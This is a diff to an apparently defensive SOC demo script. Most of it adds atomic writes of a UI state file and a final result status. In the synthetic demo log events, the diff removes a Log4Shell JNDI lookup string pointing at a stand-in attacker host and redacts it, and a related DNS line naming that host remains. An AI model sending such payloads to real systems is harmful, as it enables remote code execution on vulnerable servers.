@@ -41,7 +41,7 @@ DEMO_SERVICES = [
 DEMO_EVENTS = [
     {"ts": "2024-01-15T10:01:00Z", "source": "bots", "event_type": "web", "host": "web-srv-01",
      "src_ip": "203.0.113.50", "dst_ip": "10.0.1.20", "severity": "high",
-     "message": "GET /api/search?q=${jndi:ldap://evil.attacker.com/a} HTTP/1.1 200", "fields": {}},
+     "message": "GET /api/search?q=[log4j-jndi-pattern:redacted] HTTP/1.1 200", "fields": {}},
     {"ts": "2024-01-15T10:01:01Z", "source": "bots", "event_type": "dns", "host": "web-srv-01",
      "src_ip": "10.0.1.20", "message": "DNS query: evil.attacker.com -> 198.51.100.10", "fields": {}},
     {"ts": "2024-01-15T10:01:02Z", "source": "bots", "event_type": "alert", "host": "web-srv-01",
@@ -75,6 +75,27 @@ def run_soc_demo(bots_path: str = None, rate: int = 2000, window_size: int = 300
         "start_time": datetime.now().isoformat(),
         "config": {"bots_path": bots_path, "rate": rate, "window_size": window_size}
     }
+
+    # Write initial ui_state atomically so frontend immediately sees a running state
+    try:
+        ui_state_path = artifacts_dir / "ui_state.json"
+        tmp_path = ui_state_path.with_suffix('.tmp')
+        ui_running = {
+            "run_id": datetime.utcnow().isoformat() + "Z",
+            "status": "running",
+            "metrics": {},
+            "red": {"stage": "complete", "recent_events": []},
+            "blue": {}
+        }
+        artifacts_dir.mkdir(parents=True, exist_ok=True)
+        with open(tmp_path, 'w', encoding='utf-8') as f:
+            json.dump(ui_running, f, indent=2)
+            f.flush()
+            os.fsync(f.fileno())
+        os.replace(tmp_path, ui_state_path)
+        print(f"      Wrote initial {ui_state_path}")
+    except Exception as e:
+        print(f"Failed to write initial ui_state: {e}")
     
     print("=" * 70)
     print("SOC AUTOPILOT DEMO - Cerebras Speed Challenge")
@@ -348,14 +369,23 @@ def run_soc_demo(bots_path: str = None, rate: int = 2000, window_size: int = 300
 
         return ui
 
-    # write ui_state final
+    # write final ui_state atomically (status=complete) and include result
     ui_state_path = artifacts_dir / "ui_state.json"
     try:
-        with open(ui_state_path, "w") as f:
-            json.dump(build_ui_state(status="running"), f, indent=2)
-        print(f"      Wrote {ui_state_path}")
+        result_status = "success"
+        if not case or not getattr(case, 'evidence', None):
+            result_status = "inconclusive"
+        final_ui = build_ui_state(status="complete")
+        final_ui["result"] = result_status
+        tmp_path = ui_state_path.with_suffix('.tmp')
+        with open(tmp_path, 'w', encoding='utf-8') as f:
+            json.dump(final_ui, f, indent=2)
+            f.flush()
+            os.fsync(f.fileno())
+        os.replace(tmp_path, ui_state_path)
+        print(f"      Wrote final {ui_state_path}")
     except Exception as e:
-        print(f"Failed to write ui_state: {e}")
+        print(f"Failed to write final ui_state: {e}")
     
     # ─────────────────────────────────────────────────────────────────────
     # Summary
